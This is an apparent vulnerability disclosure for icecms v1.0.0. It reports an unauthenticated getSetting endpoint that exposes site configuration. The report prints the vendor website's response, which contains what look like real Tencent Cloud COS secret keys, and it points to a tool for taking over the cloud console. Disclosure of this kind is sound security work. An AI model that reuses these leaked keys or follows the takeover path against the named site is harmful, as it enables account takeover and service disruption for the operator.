|  | [PRODUCT] |
|  | icecms |
|  | [VERSION] |
|  | v1.0.0 |
|  | [Vulnerability TYPE] |
|  | Insecure Permissions |
|  | [Root Cause] |
|  | The icecms allows anyone to browser getSetting api,like my local test environment http://localhost:8181/WebSitting/getSetting, |
|  | and official website url:https://www.macwk.cc/api/Sitting/getCosSetting. |
|  | The official website content is : |
|  | { |
|  | "id": 1, |
|  | "beian": "鲁ICP备19036164号", |
|  | "banquan": "Macwk.com © 2019. All rights reserved.", |
|  | "comment\_show": false, |
|  | "sitTitle": "CMS", |
|  | "sitLogo": "", |
|  | "imageFormat": false, |
|  | "cosIntage": "https://icewk-1305088812.cos.ap-nanjing.myqcloud.com", |
|  | "cosBucketName": "icewk-1305088812", |
|  | "cosSecretId": "AKIDjDRQDrRXcA7TfQNk9LO3EJchbFeneY4U", |
|  | "cosSecretKey": "blgxyuiIfnCLaZXH5i6FB4gmDPilY8zb", |
|  | "cosClientConfig": "ap-nanjing", |
|  | "isCos": false |
|  | } |
|  |  |
|  | An attacker can obtain the following credentials from the content above:"cosSecretId": "AKIDjDRQDrRXcA7TfQNk9LO3EJchbFeneY4U","cosSecretKey": "blgxyuiIfnCLaZXH5i6FB4gmDPilY8zb", |
|  | From the mentioned link (cosIntage) link, we can deduce that the official website is using Elastic Compute Cloud provided by Tencent Cloud platform similar to the AWS cloud platform. |
|  | By using the tool provided at https://wiki.teamssix.com/cf/,an attacker can take control of the official user's Tencent cloud platform console and gain access to all cloud services. |
|  |  |
|  | [Impact] |
|  | An attacker can take control of the official user's Tencent cloud platform console can poweroff the server and gain access to all cloud services. |
